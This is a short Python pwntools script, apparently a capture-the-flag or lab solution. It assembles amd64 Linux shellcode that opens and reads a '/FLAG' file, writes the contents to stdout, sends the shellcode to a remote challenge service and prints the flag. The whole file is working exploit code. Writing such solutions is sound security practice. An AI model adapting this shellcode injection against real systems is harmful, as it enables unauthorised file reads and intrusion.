#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'
#rdi rsi rdx
#open
#read(fd, buf, 100)
shellcode = asm('''
    xor rax, rax
    mov rbx, 0x47414c462f
    push rbx         
    mov rdi, rsp
    xor rsi, rsi
    mov rax, 2
    syscall
    
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 100
    xor rax, rax
    syscall

    mov rdi, 1
    mov rax, 1
    syscall

    mov rax, 60
    xor rdi, rdi
    syscall
''')


r = remote("up.zoolab.org", 12341)
r.recvuntil(b'Enter your code> ')
r.send(shellcode)

flag = r.recvall()
print(flag)


r.close()
